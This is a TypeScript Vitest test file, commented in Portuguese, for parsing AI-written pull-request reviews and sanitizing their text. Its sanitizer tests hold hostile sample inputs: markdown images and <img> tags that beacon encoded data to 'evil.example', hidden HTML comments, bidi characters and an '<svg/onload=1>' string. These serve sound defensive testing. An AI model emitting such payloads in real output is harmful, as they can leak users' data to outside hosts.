import { describe, expect, it } from 'vitest'
import {
  PUBLISH_COMMENTS_MAX,
  PUBLISH_REVIEW_MESSAGES as M,
  PUBLISH_SUMMARY_MAX,
  finalText,
  parseReviewAnswer,
  sanitizeReviewText
} from './review-publish'

const REVIEW = {
  event: 'REQUEST_CHANGES',
  summary: '## Revisão\n\nFalta validar.',
  comments: [{ path: 'src/a.ts', line: 3, body: 'Valide aqui.' }]
}

describe('parseReviewAnswer', () => {
  it('lê o bloco ```json (com texto em volta) ou o texto inteiro', () => {
    const fenced = `Aqui está:\n\n\`\`\`json\n${JSON.stringify(REVIEW)}\n\`\`\`\nPronto.`
    expect(parseReviewAnswer(fenced)).toEqual({ ok: true, review: REVIEW })
    expect(parseReviewAnswer(JSON.stringify(REVIEW))).toEqual({ ok: true, review: REVIEW })
    // Bloco sem linguagem também, se for um objeto; o último bloco json vence.
    expect(parseReviewAnswer(`\`\`\`\n${JSON.stringify(REVIEW)}\n\`\`\``)).toMatchObject({
      ok: true
    })
    const two = `\`\`\`json\n{"x":1}\n\`\`\`\n\`\`\`json\n${JSON.stringify({ ...REVIEW, event: 'COMMENT' })}\n\`\`\``
    expect(parseReviewAnswer(two)).toMatchObject({ ok: true, review: { event: 'COMMENT' } })
  })

  it('comentários são opcionais', () => {
    expect(parseReviewAnswer(JSON.stringify({ event: 'COMMENT', summary: 'ok' }))).toEqual({
      ok: true,
      review: { event: 'COMMENT', summary: 'ok', comments: [] }
    })
  })

  it('recusa o que não é uma revisão válida (com mensagem pt-BR)', () => {
    expect(parseReviewAnswer(null)).toEqual({ ok: false, message: M.noAnswer })
    expect(parseReviewAnswer('  ')).toEqual({ ok: false, message: M.noAnswer })
    expect(parseReviewAnswer('Revisei e está tudo bem.')).toEqual({ ok: false, message: M.notJson })
    expect(parseReviewAnswer('[1,2]')).toEqual({ ok: false, message: M.notJson })
    for (const event of ['APPROVE', 'approve', 'request_changes', undefined]) {
      expect(parseReviewAnswer(JSON.stringify({ ...REVIEW, event }))).toEqual({
        ok: false,
        message: M.badEvent
      })
    }
    expect(parseReviewAnswer(JSON.stringify({ ...REVIEW, summary: '' }))).toEqual({
      ok: false,
      message: M.badSummary
    })
    expect(
      parseReviewAnswer(JSON.stringify({ ...REVIEW, summary: 'x'.repeat(PUBLISH_SUMMARY_MAX + 1) }))
    ).toEqual({ ok: false, message: M.badSummary })
    const many = Array.from({ length: PUBLISH_COMMENTS_MAX + 1 }, (_, i) => ({
      path: 'a.ts',
      line: i + 1,
      body: 'x'
    }))
    expect(parseReviewAnswer(JSON.stringify({ ...REVIEW, comments: many }))).toEqual({
      ok: false,
      message: M.tooManyComments
    })
    for (const bad of [
      { path: '', line: 1, body: 'x' },
      { path: 'a.ts', line: 0, body: 'x' },
      { path: 'a.ts', line: 1.5, body: 'x' },
      { path: 'a.ts', line: '3', body: 'x' },
      { path: 'a.ts', line: 1, body: ' ' },
      'texto'
    ]) {
      expect(parseReviewAnswer(JSON.stringify({ ...REVIEW, comments: [bad] }))).toEqual({
        ok: false,
        message: M.badComment
      })
    }
    // Todas as mensagens são reconhecidas pela tela de problema ("A revisão em JSON …").
    for (const m of Object.values(M)) expect(m).toMatch(/^A revisão em JSON/)
  })
})

describe('finalText', () => {
  it('evento result primeiro; senão a última mensagem do Claude', () => {
    expect(
      finalText([
        { kind: 'text', text: 'a' },
        { kind: 'result', text: 'final' } as never,
        { kind: 'text', text: 'b' }
      ])
    ).toBe('final')
    expect(
      finalText([
        { kind: 'text', text: 'a' },
        { kind: 'text', text: 'b' }
      ])
    ).toBe('b')
    expect(finalText([])).toBeNull()
  })
})

describe('sanitizeReviewText (o gate mostra exatamente o que vai para a PR)', () => {
  it('imagem markdown vira texto; links ficam como estão', () => {
    expect(sanitizeReviewText('Veja ![gráfico](https://evil.example/p?d=abc) e ![](x.png).')).toBe(
      'Veja [imagem: gráfico] e [imagem].'
    )
    expect(sanitizeReviewText('Ref ![logo][1]\n\n[1]: https://evil.example/l.png')).toBe(
      'Ref [imagem: logo]\n\n[1]: https://evil.example/l.png'
    )
    expect(sanitizeReviewText('Leia [a doc](https://docs.example/x) antes.')).toBe(
      'Leia [a doc](https://docs.example/x) antes.'
    )
  })

  it('tira <img>, tags com atributos, elementos HTML e comentários HTML', () => {
    expect(sanitizeReviewText('Ok <img src="https://evil.example/p?d=c2VncmVkbw=="> fim')).toBe(
      'Ok  fim'
    )
    expect(sanitizeReviewText('a<!-- escondido: https://evil.example -->b')).toBe('ab')
    expect(sanitizeReviewText('a<!-- sem fim https://evil.example')).toBe('a')
    expect(sanitizeReviewText('<details><summary>x</summary>oculto</details>')).toBe('xoculto')
    expect(sanitizeReviewText('<x-y data-a="1">t</x-y>')).toBe('t</x-y>')
    // Remontagem depois de tirar uma tag também é pega.
    expect(sanitizeReviewText('<im<b>g src=x>')).toBe('')
    expect(sanitizeReviewText('!<b>[a](http://e/x.png)')).toBe('[imagem: a]')
    // Dentro de código também (o GitHub mostra como texto, mas não arriscamos divergir).
    expect(sanitizeReviewText('```\n<img src="https://e/x">\n```')).toBe('```\n\n```')
  })

  it('nenhuma forma de imagem markdown passa: o `![` que sobra vira `!\\[` (texto no GitHub)', () => {
    // Referência curta: a definição fica (é só um link), a imagem não.
    expect(sanitizeReviewText('Veja ![a]\n\n[a]: https://evil.example/p.png')).toBe(
      'Veja !\\[a]\n\n[a]: https://evil.example/p.png'
    )
    // Alt com colchetes.
    expect(sanitizeReviewText('![a [b]](https://evil.example/p.png)')).toBe(
      '!\\[a [b]](https://evil.example/p.png)'
    )
    expect(sanitizeReviewText('![a][1]')).toBe('[imagem: a]')
    expect(sanitizeReviewText('![a][]')).toBe('[imagem: a]')
    // Parênteses balanceados na URL: não sobra `.png)`.
    expect(sanitizeReviewText('x ![a](u(1).png) y')).toBe('x [imagem: a] y')
    for (const t of ['![a]', '![a [b]](u)', 'x ![a][b] ![c]']) {
      expect(sanitizeReviewText(t)).not.toMatch(/!\[/)
      const once = sanitizeReviewText(t)
      expect(sanitizeReviewText(once)).toBe(once)
    }
  })

  it('texto com `!` e `[` sem formar `![` não muda', () => {
    for (const t of [
      'Atenção! [ver](https://d.example)',
      'a ! [b]',
      '!\n[x]',
      'Ok!',
      'lista [1]!'
    ]) {
      expect(sanitizeReviewText(t)).toBe(t)
    }
  })

  it('tira caracteres invisíveis de formato (zero-width, bidi), menos o ZWJ', () => {
    expect(sanitizeReviewText('a\u200Bb\u200Cc\u2060d\uFEFFe')).toBe('abcde')
    expect(sanitizeReviewText('x\u202Eevil\u202C\u2066y\u2069')).toBe('xevily')
    // Zero-width no meio de `![`: sai antes da conversão, e a imagem também.
    expect(sanitizeReviewText('!\u200B[a](https://evil.example/p.png)')).toBe('[imagem: a]')
    // ZWJ (emoji composto: família, bandeiras) fica.
    const family = '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}'
    expect(sanitizeReviewText(family)).toBe(family)
  })

  it('documenta: `<img/src=x>` e `<svg/onload=1>` ficam (o GitHub os mostra como texto)', () => {
    // Sem espaço entre o nome e o atributo não é tag HTML válida para o GitHub (CommonMark): vira
    // texto escapado na PR, nada carrega. O saneamento não mexe (o gate mostra exatamente isto).
    expect(sanitizeReviewText('a <img/src=x> b')).toBe('a <img/src=x> b')
    expect(sanitizeReviewText('<svg/onload=1>')).toBe('<svg/onload=1>')
  })

  it('tipos genéricos e comparações ficam', () => {
    const text = 'Use `Array<string>`, Map<K, V>, Promise<void> e a < b > c.'
    expect(sanitizeReviewText(text)).toBe(text)
  })

  it('aplicar de novo não muda nada', () => {
    for (const t of [
      'x ![a](b) <img src=y> <!-- c --> [d](e)',
      '<<img src=1>img src=2>',
      'texto normal'
    ]) {
      const once = sanitizeReviewText(t)
      expect(sanitizeReviewText(once)).toBe(once)
    }
  })
})
